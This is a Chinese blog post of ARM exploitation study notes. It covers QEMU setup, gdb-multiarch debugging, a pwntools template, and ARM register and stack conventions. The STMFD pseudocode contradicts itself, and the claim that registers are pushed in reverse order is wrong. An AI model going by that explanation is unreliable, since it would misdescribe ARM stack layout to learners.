<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ARM学习笔记 | SkYe231 Blog</title><meta name="keywords" content="PWN,ARM"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境搭建（基于Ubuntu18.04) 目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。 现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。  安装 qemu使用包管理查了下包管理器安装的版本停留在 2.x 版本，考虑">
<meta property="og:type" content="article">
<meta property="og:title" content="ARM学习笔记">
<meta property="og:url" content="https://www.mrskye.cn/archives/efe6e61e/index.html">
<meta property="og:site_name" content="SkYe231 Blog">
<meta property="og:description" content="环境搭建（基于Ubuntu18.04) 目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。 现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。  安装 qemu使用包管理查了下包管理器安装的版本停留在 2.x 版本，考虑">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.mrskye.cn/img/default_cover0.jpg">
<meta property="article:published_time" content="2020-12-12T06:12:00.000Z">
<meta property="article:modified_time" content="2021-04-06T09:21:10.944Z">
<meta property="article:author" content="SkYe231">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="ARM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.mrskye.cn/img/default_cover0.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.mrskye.cn/archives/efe6e61e/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-154693872-1');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ARM学习笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-06 17:21:10'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">145</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.now.sh/"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover0.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.now.sh/"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ARM学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-12T06:12:00.000Z" title="发表于 2020-12-12 14:12:00">2020-12-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-06T09:21:10.944Z" title="更新于 2021-04-06 17:21:10">2021-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/ARM/">ARM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ARM学习笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="环境搭建（基于Ubuntu18-04"><a href="#环境搭建（基于Ubuntu18-04" class="headerlink" title="环境搭建（基于Ubuntu18.04)"></a>环境搭建（基于Ubuntu18.04)</h1><blockquote>
<p>目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。</p>
<p>现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。</p>
</blockquote>
<h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><h3 id="使用包管理"><a href="#使用包管理" class="headerlink" title="使用包管理"></a>使用包管理</h3><p>查了下包管理器安装的版本停留在 2.x 版本，考虑到最近有的程序要用新版本才能加载，放弃这种方式安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看apt安装版本</span></span><br><span class="line">apt-cache madison qemu</span><br><span class="line"></span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-updates/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://cn.archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://security.ubuntu.com/ubuntu bionic-security/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://mirrors.aliyun.com/ubuntu bionic/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://cn.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://mirrors.aliyun.com/ubuntu bionic/main Sources</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-security/main Sources</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-updates/main Sources</span><br></pre></td></tr></table></figure>

<h3 id="从源码编译安装"><a href="#从源码编译安装" class="headerlink" title="从源码编译安装"></a>从源码编译安装</h3><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-5.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-5.2.0.tar.xz</span><br><span class="line">cd qemu-5.2.0</span><br></pre></td></tr></table></figure>

<h4 id="处理依赖"><a href="#处理依赖" class="headerlink" title="处理依赖"></a>处理依赖</h4><blockquote>
<p>这里依赖是根据本机环境来装，可能有些需要的依赖已经安装完成</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br><span class="line"><span class="meta">#</span><span class="bash"> re2c</span></span><br><span class="line">sudo apt-get install re2c</span><br><span class="line"><span class="meta">#</span><span class="bash"> ninja</span> </span><br><span class="line">sudo apt-get install ninja-build</span><br><span class="line"><span class="meta">#</span><span class="bash"> other</span></span><br><span class="line">sudo apt install pkg-config</span><br><span class="line">sudo apt install libglib2.0-dev</span><br><span class="line">sudo apt install libpixman-1-dev</span><br></pre></td></tr></table></figure>

<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --static</span><br><span class="line">sudo make -j4 # 多线程编译自行调整</span><br><span class="line">sudo make install </span><br></pre></td></tr></table></figure>

<blockquote>
<p>学了路由器挖洞后发现，如果是动态链接需要将 qemu 运行库也拉到当前目录下面，可能会和固件的 lib 文件夹共用，文件重名等，所以后来将 qemu 换成了静态编译就直接把程序拖过去就行了。</p>
</blockquote>
<p><code>./configure</code> 使用默认选项安装全部架构的环境，安装路径在 <code>/usr/local/bin</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Install prefix: /usr/local</span><br><span class="line">         BIOS directory: share/qemu</span><br><span class="line">          firmware path: /usr/local/share/qemu-firmware</span><br><span class="line">       binary directory: bin</span><br><span class="line">      library directory: lib</span><br><span class="line">       module directory: lib/qemu</span><br><span class="line">      libexec directory: libexec</span><br><span class="line">      include directory: include</span><br><span class="line">       config directory: /usr/local/etc</span><br><span class="line">  local state directory: /usr/local/var</span><br><span class="line">       Manual directory: share/man</span><br><span class="line">          Doc directory: /usr/local/share/doc</span><br><span class="line">        Build directory: /home/skye/qemu-5.2.0/build</span><br><span class="line">            Source path: /home/skye/qemu-5.2.0</span><br></pre></td></tr></table></figure>

<h3 id="验证安装成功"><a href="#验证安装成功" class="headerlink" title="验证安装成功"></a>验证安装成功</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~$</span><span class="bash"> qemu-arm --version</span></span><br><span class="line">qemu-arm version 5.2.0</span><br><span class="line">Copyright (c) 2003-2020 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure>

<p>到这里就能直接运行静态编译的多架构程序。可选清一下中间文件 <code>make clean</code></p>
<h2 id="安装动态运行库"><a href="#安装动态运行库" class="headerlink" title="安装动态运行库"></a>安装动态运行库</h2><p>使用命令<code>apt-cache search &quot;libc6&quot; | grep &quot;&#123;架构名称&#125;&quot;</code>搜索并筛选可用的多架构运行库。</p>
<p>我们只需要安装形如<code>libc6-*-cross</code>的运行库即可。</p>
<h2 id="安装binutils环境"><a href="#安装binutils环境" class="headerlink" title="安装binutils环境"></a>安装binutils环境</h2><blockquote>
<p>原因：避免 pwntools 用 asm 时出错<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-10">LINK</a></p>
</blockquote>
<p>需要安装binutils依赖，首先使用命令<code>apt search binutils | grep [arch]</code>(此处的[arch]请自行替换)，随后安装显示出的包即可完成。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuu1010/article/details/104998804/">编译和安装QEMU-5.0.0</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/virtualization/qemu/qemu-install-and-debug/">qemu安装与调试</a></p>
<p><a target="_blank" rel="noopener" href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></p>
<h1 id="qemu-使用"><a href="#qemu-使用" class="headerlink" title="qemu 使用"></a>qemu 使用</h1><h2 id="一般调试"><a href="#一般调试" class="headerlink" title="一般调试"></a>一般调试</h2><p>以调试方式启动程序，程序启动后命中开头断点，等待 gdb 链接调试 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g [port] -L [dynamically linked file] filename</span><br></pre></td></tr></table></figure>

<p>新建终端 <code>gdb-multiarch filename -q</code> 启动 gdb </p>
<p>进入GDB后，首先使用命令<code>set architecture [Arch-name]</code>设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)</p>
<p>然后使用<code>target remote localhost:[port]</code>来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为<code>gef-remote localhost:[port]</code>)</p>
<p>调试其他架构和运行库分别调整 qemu 和 -L 参数</p>
<h2 id="脚本模板"><a href="#脚本模板" class="headerlink" title="脚本模板"></a>脚本模板</h2><blockquote>
<p>From:<a target="_blank" rel="noopener" href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">:link:</a></p>
<p>使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;your_binary&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;your_binary&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;your_binary&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;your_binary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="ARM架构"><a href="#ARM架构" class="headerlink" title="ARM架构"></a>ARM架构</h1><p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。</p>
<h2 id="寄存器规则"><a href="#寄存器规则" class="headerlink" title="寄存器规则"></a>寄存器规则</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="img"></p>
<ol>
<li>子程序间通过寄存器<strong>R0～R3</strong>来<strong>传递参数</strong>。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li>
<li>在子程序中，使用寄存器<strong>R4～R11</strong>来<strong>保存局部变量</strong>。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则<strong>子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值</strong>。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li>
<li>寄存器<strong>R12</strong>用作<strong>过程调用中间临时寄存器</strong>，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li>
<li>寄存器<strong>R13</strong>用作<strong>堆栈指针</strong>，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li>
<li>寄存器<strong>R14</strong>称为<strong>连接寄存器</strong>，记作LR。它用于<strong>保存子程序的返回地址</strong>。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li>
<li>寄存器<strong>R15</strong>是<strong>程序计数器</strong>，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li>
</ol>
<h2 id="ARM寄存器与Intel寄存器对照关系"><a href="#ARM寄存器与Intel寄存器对照关系" class="headerlink" title="ARM寄存器与Intel寄存器对照关系"></a>ARM寄存器与Intel寄存器对照关系</h2><table>
<thead>
<tr>
<th align="center">ARM架构 寄存器名</th>
<th align="center">寄存器描述</th>
<th align="center">Intel架构 寄存器名</th>
</tr>
</thead>
<tbody><tr>
<td align="center">R0</td>
<td align="center">通用寄存器</td>
<td align="center">EAX</td>
</tr>
<tr>
<td align="center">R1~R5</td>
<td align="center">通用寄存器</td>
<td align="center">EBX、ECX、EDX、EDI、ESI</td>
</tr>
<tr>
<td align="center">R6~R10</td>
<td align="center">通用寄存器</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">R11(FP)</td>
<td align="center">栈帧指针</td>
<td align="center">EBP</td>
</tr>
<tr>
<td align="center">R12(IP)</td>
<td align="center">内部程序调用</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">R13(SP)</td>
<td align="center">堆栈指针</td>
<td align="center">ESP</td>
</tr>
<tr>
<td align="center">R14(LR)</td>
<td align="center">链接寄存器</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">R15(PC)</td>
<td align="center">程序计数器</td>
<td align="center">EIP</td>
</tr>
<tr>
<td align="center">CPSR</td>
<td align="center">程序状态寄存器</td>
<td align="center">EFLAGS</td>
</tr>
</tbody></table>
<h2 id="堆栈-Stack-规则"><a href="#堆栈-Stack-规则" class="headerlink" title="堆栈(Stack)规则"></a>堆栈(Stack)规则</h2><p>ATPCS规定堆栈为FD类型，即Full Descending，意思是 <strong>SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长</strong>，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有<strong>STMFD和LDMFD</strong>。</p>
<h3 id="STMFD"><a href="#STMFD" class="headerlink" title="STMFD"></a>STMFD</h3><p>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。<code>STMFD SP! ,&#123;R0-R7，LR&#125;</code>实际上会执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP - <span class="number">9</span> x <span class="number">4</span> <span class="comment">//(共计压入R0-R7以及LR一共九个寄存器)</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line">MEMORY[ADDRESS] = LR</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">7</span> to <span class="number">0</span></span><br><span class="line">    MEMORY[ADDRESS] = Ri</span><br><span class="line">    ADDRESS = ADDRESS + <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>此处也可以看出，事实上的入栈顺序与<code>R0-R7，LR</code>相反。</p>
<p>执行<code>SP = SP - 9 x 4</code>后<a target="_blank" rel="noopener" href="https://img.lhyerror404.cn/error404/2020-02-03-032143.png"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.lhyerror404.cn/error404/2020-02-03-032143.png" alt="image-20200203112143013"></a></p>
<p>执行<code>ADDRESS = SP</code>后 <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.lhyerror404.cn/error404/2020-02-03-032503.png" alt="image-20200203112502852"></p>
